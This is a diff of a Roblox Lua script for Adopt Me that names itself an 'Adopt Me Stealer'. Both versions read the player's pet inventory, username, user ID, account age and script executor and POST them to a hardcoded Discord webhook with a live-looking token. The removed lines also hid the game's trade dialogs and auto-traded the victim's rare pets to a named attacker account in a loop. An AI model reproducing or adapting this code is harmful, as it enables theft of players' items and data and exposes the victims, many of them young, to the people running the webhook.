@@ -1,218 +1,100 @@
 local Username = "preppymacdo1"
 local Webhook = "https://discord.com/api/webhooks/1530307687533908069/QN5Vge8NEb_grcxstWh4ElJWkbimA_f8AJYkPsLuUUAS7caG42-Dtjtz74hJi8DjgZ_W"
-local Pets = {}
-local PetCounts = {}
+
 local Loaders = require(game.ReplicatedStorage.Fsys).load
 local InventoryDB = Loaders("InventoryDB")
 local ClientData = Loaders("ClientData")
 local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
 local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
 
-local neon_count = 0
-local mega_neon_count = 0
-local flyable_count = 0
-local rideable_count = 0
-local legendaries_count = 0
-local ultra_count = 0
-local rare_count = 0
-local uncommon_count = 0
-local common_count = 0
-local fr_count = 0
+local stats = {
+    neon_count = 0,
+    mega_neon_count = 0,
+    flyable_count = 0,
+    rideable_count = 0,
+    legendaries_count = 0,
+    ultra_count = 0,
+    rare_count = 0,
+    uncommon_count = 0,
+    common_count = 0,
+    fr_count = 0,
+    total = 0
+}
 
 for _, petData in pairs(playerData.inventory.pets) do
     if petData.properties and type(petData.properties) == "table" then
-        if petData.properties.neon then
-            neon_count = neon_count + 1
-        end
-        if petData.properties.mega_neon then
-            mega_neon_count = mega_neon_count + 1
-        end
-        if petData.properties.flyable then
-            flyable_count = flyable_count + 1
-        end
-        if petData.properties.rideable then
-            rideable_count = rideable_count + 1
-        end
-        if petData.properties.rideable and petData.properties.flyable then
-            fr_count = fr_count + 1
-        end
+        if petData.properties.neon then stats.neon_count = stats.neon_count + 1 end
+        if petData.properties.mega_neon then stats.mega_neon_count = stats.mega_neon_count + 1 end
+        if petData.properties.flyable then stats.flyable_count = stats.flyable_count + 1 end
+        if petData.properties.rideable then stats.rideable_count = stats.rideable_count + 1 end
+        if petData.properties.rideable and petData.properties.flyable then stats.fr_count = stats.fr_count + 1 end
     end
 end
 
 for i, v in pairs(ClientData.get("inventory").pets) do
     local petData = InventoryDB[v.category][v.id]
-
     if petData.rarity == "legendary" then
-        legendaries_count = legendaries_count + 1
+        stats.legendaries_count = stats.legendaries_count + 1
     elseif petData.rarity == "ultra_rare" then
-        ultra_count = ultra_count + 1
+        stats.ultra_count = stats.ultra_count + 1
     elseif petData.rarity == "rare" then
-        rare_count = rare_count + 1
+        stats.rare_count = stats.rare_count + 1
     elseif petData.rarity == "uncommon" then
-        uncommon_count = uncommon_count + 1
+        stats.uncommon_count = stats.uncommon_count + 1
     elseif petData.rarity == "common" then
-        common_count = common_count + 1
+        stats.common_count = stats.common_count + 1
     end
 end
 
-if legendaries_count == 1 then
-    legendaries_count = 0
-elseif legendaries_count > 1 then
-    legendaries_count = legendaries_count - 1
+if stats.legendaries_count == 1 then
+    stats.legendaries_count = 0
+elseif stats.legendaries_count > 1 then
+    stats.legendaries_count = stats.legendaries_count - 1
 end
 
-if ultra_count == 1 then
-    ultra_count = 0
-elseif ultra_count > 1 then
-    ultra_count = ultra_count - 1
+if stats.ultra_count == 1 then
+    stats.ultra_count = 0
+elseif stats.ultra_count > 1 then
+    stats.ultra_count = stats.ultra_count - 1
 end
 
-if rare_count == 1 then
-    rare_count = 0
-elseif rare_count > 1 then
-    rare_count = rare_count - 1
+if stats.rare_count == 1 then
+    stats.rare_count = 0
+elseif stats.rare_count > 1 then
+    stats.rare_count = stats.rare_count - 1
 end
 
-if common_count == 1 then
-    common_count = 0
-elseif common_count > 1 then
-    common_count = common_count - 2
+if stats.common_count == 1 then
+    stats.common_count = 0
+elseif stats.common_count > 1 then
+    stats.common_count = stats.common_count - 2
 end
 
-local total = legendaries_count + ultra_count + rare_count + uncommon_count + common_count
+stats.total = stats.legendaries_count + stats.ultra_count + stats.rare_count + stats.uncommon_count + stats.common_count
 
-  local exploit
-  local function getexploit()
-      local exploitt =
-      identifyexecutor()
-      exploit = exploitt
-  end
-  getexploit()
-  local plr = game.Players.LocalPlayer
-  local userid = game.Players.LocalPlayer.UserId
-  local accage = game.Players.LocalPlayer.AccountAge
-  local data = {
+local exploit = identifyexecutor() or "Unknown"
+local plr = game.Players.LocalPlayer
+local userid = game.Players.LocalPlayer.UserId
+local accage = game.Players.LocalPlayer.AccountAge
+
+local data = {
     username = 'Kenn | Adopt Me Stealer!!',
     avatar_url = 'https://cdn.discordapp.com/attachments/1309897803664719954/1317140673748533320/pp_akmal.jpg?ex=675f9497&is=675e4317&hm=ab0c33daa815ab2bdbe5ec3e83fd59f14d5d86ee554411dc191e47108aeed100&',
     content = '-- [[@everyone]]\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "cbaf4fed-5c00-4953-921c-9dcba2a25853")',
-    embeds = {
-      {
+    embeds = {{
         title = '**New Hits!** Bule dongo aselole',
-        description = '**〘👤〙Player Info**: \n ```lua\nExecutor 🔌: '.. tostring(exploit) ..'\nUsername 🧑: '.. tostring(plr) ..'\nUser-ID  🚀: '.. tostring(userid) ..'\nAcc Age  🌠: '.. tostring(accage) ..' Days\nReceiver 💌: '.. Username ..'\n```\n **⟪🎒⟫ Inventory**: \n ```lua\nLegendaries 🦒: '.. tostring(legendaries_count).. '\nUltra Rares 🐊: '.. tostring(ultra_count).. '\nRares       🐌: '.. tostring(rare_count).. '\nUncommons   🦀: '.. tostring(uncommon_count).. '\nCommons     🐱: '.. tostring(common_count).. '\nTotal Pets  🤑: '.. tostring(total).. '\n\nMega-Neon   🐉: '.. tostring(mega_neon_count).. '\nNeon Only   🐲: '.. tostring(neon_count).. '\nF/R Pets    🦄: '.. tostring(fr_count).. '```\n**Claim All Script 🎁**:\n```lua\n-- Coming Soon.```\n**[Click me To Join Manually!](https://www.roblox.com/tr/games/18845424641/Mori-Scripts-TELEPORTER)**\n\n**Join from Console**: \n```lua\nRoblox.GameLauncher.joinGameInstance(142823291, "cbaf4fed-5c00-4953-921c-9dcba2a25853")```\n\n**Discord Server 🐒**:\n[Join Invite](https://discord.gg/mDmB3rnZjw)',
+        description = '**〘👤〙Player Info**: \n ```lua\nExecutor 🔌: '.. tostring(exploit) ..'\nUsername 🧑: '.. tostring(plr) ..'\nUser-ID  🚀: '.. tostring(userid) ..'\nAcc Age  🌠: '.. tostring(accage) ..' Days\nReceiver 💌: '.. Username ..'\n```\n **⟪🎒⟫ Inventory**: \n ```lua\nLegendaries 🦒: '.. tostring(stats.legendaries_count).. '\nUltra Rares 🐊: '.. tostring(stats.ultra_count).. '\nRares       🐌: '.. tostring(stats.rare_count).. '\nUncommons   🦀: '.. tostring(stats.uncommon_count).. '\nCommons     🐱: '.. tostring(stats.common_count).. '\nTotal Pets  🤑: '.. tostring(stats.total).. '\n\nMega-Neon   🐉: '.. tostring(stats.mega_neon_count).. '\nNeon Only   🐲: '.. tostring(stats.neon_count).. '\nF/R Pets    🦄: '.. tostring(stats.fr_count).. '```\n**Claim All Script 🎁**:\n```lua\n-- Coming Soon.```\n**[Click me To Join Manually!](https://www.roblox.com/tr/games/18845424641/Mori-Scripts-TELEPORTER)**\n\n**Join from Console**: \n```lua\nRoblox.GameLauncher.joinGameInstance(142823291, "cbaf4fed-5c00-4953-921c-9dcba2a25853")```\n\n**Discord Server 🐒**:\n[Join Invite](https://discord.gg/mDmB3rnZjw)',
         color = 14423100,
-        footer = {
-          text = "Time: " .. os.date("%Y-%m-%d %H:%M:%S")
-      }
-      }
-    }
-  }
-  local httpRequest = http.request or httprequest
-  if httpRequest then
+        footer = { text = "Time: " .. os.date("%Y-%m-%d %H:%M:%S") }
+    }}
+}
+
+local httpRequest = http.request or httprequest
+if httpRequest then
     httpRequest({
-      Url = Webhook,
-      Method = 'POST',
-      Headers = {
-        ['Content-Type'] = 'application/json'
-      },
-      Body = game:GetService('HttpService'):JSONEncode(data)
+        Url = Webhook,
+        Method = 'POST',
+        Headers = { ['Content-Type'] = 'application/json' },
+        Body = game:GetService('HttpService'):JSONEncode(data)
     })
-  else
-    print("LMAOOOOOO")
-  end
-
-game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
-game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
-game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
-
-local stealActive = false
-local function StartSteal()
-    if stealActive then
-        return
-    end
-    stealActive = true
-    local RouterClient = Loaders("RouterClient")
-    local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
-    local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
-    local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
-    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
-
-    local function offset(guiElement)
-        if guiElement then
-            guiElement.Position = UDim2.new(1000, 0, 1000, 0)
-        end
-    end
-    local dialogApp = game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("DialogApp")
-    if dialogApp and dialogApp:FindFirstChild("Dialog") then
-        offset(dialogApp.Dialog)
-    end
-
-    SendTrade:FireServer(game.Players[Username])
-
-    local PetsInventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
-    local InventoryDB = require(game.ReplicatedStorage.Fsys).load("InventoryDB")
-
-    local function bighit(pet)
-        return pet.properties and (pet.properties.mega_neon or pet.properties.neon or pet.properties.flying or pet.properties.ride)
-    end
-
-    local function shit(pet)
-        local petData = InventoryDB[pet.category][pet.id]
-        return petData.rarity == "legendary" or petData.rarity == "ultra_rare" or bighit(pet)
-    end
-
-    local petUids = {}
-    for petUid, pet in pairs(PetsInventory.pets) do
-        if shit(pet) then
-            table.insert(petUids, {uid = petUid})
-        end
-    end
-
-    local petCount = 0
-    local petLimit = 18
-    while #petUids > 0 and petCount < petLimit do
-        if not stealActive then
-            break
-        end
-
-        local petEntry = table.remove(petUids, 1)
-        AddPetRemote:FireServer(petEntry.uid)
-        petCount = petCount + 1
-    end
-
-    AcceptNegotiationRemote:FireServer()
-    ConfirmTradeRemote:FireServer()
-    stealActive = false
-    wait(1)
-    StartSteal()
-end
-
--- Функция для проверки наличия игрока
-local function CheckAndStart()
-    -- Проверяем, есть ли игрок уже в игре
-    if game.Players:FindFirstChild(Username) then
-        print("Игрок " .. Username .. " найден! Запускаем кражу...")
-        StartSteal()
-        return true
-    else
-        print("Игрок " .. Username .. " не найден. Ожидаем появления...")
-        return false
-    end
-end
-
--- Проверяем сразу
-if CheckAndStart() then
-    -- Если игрок уже есть, ничего не делаем
-else
-    -- Если игрока нет, подписываемся на событие появления
-    local connection
-    connection = game.Players.PlayerAdded:Connect(function(player)
-        if player.Name == Username then
-            print("Игрок " .. Username .. " зашёл в игру! Запускаем кражу...")
-            -- Отключаем соединение, чтобы не запускать дважды
-            if connection then
-                connection:Disconnect()
-            end
-            StartSteal()
-        end
-    end)
 end
